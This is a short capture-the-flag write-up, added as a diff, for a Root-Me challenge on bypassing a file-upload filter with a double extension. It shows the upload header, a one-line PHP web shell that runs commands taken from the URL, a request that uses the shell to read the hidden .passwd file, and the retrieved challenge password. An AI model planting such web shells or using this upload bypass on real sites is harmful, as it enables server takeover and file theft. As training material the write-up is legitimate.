@@ -1,0 +1,23 @@
+WebServer Challenge 20 - File upload double extension:
+
+
+Synopsis: Your goal is to hack this photo galery by uploading PHP code.
+Retrieve the validation password in the file .passwd at the root of the application.
+
+
+I personally used Burp Suite but the goal here is to upload evil php and append a .gif extension to the php code:
+
+Content-Disposition: form-data; name="file"; filename="x.php.gif"
+Content-Type: text/php
+
+<?php
+system($_GET['c']);
+?>
+
+
+From there I requested: 
+http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/3ptntl9huu7an75hj3hu809lp6/x.php.gif?c=cat%20../../../.passwd
+
+Whice retrieved:
+
+Gg9LRz-hWSxqqUKd77-_q-6G8 
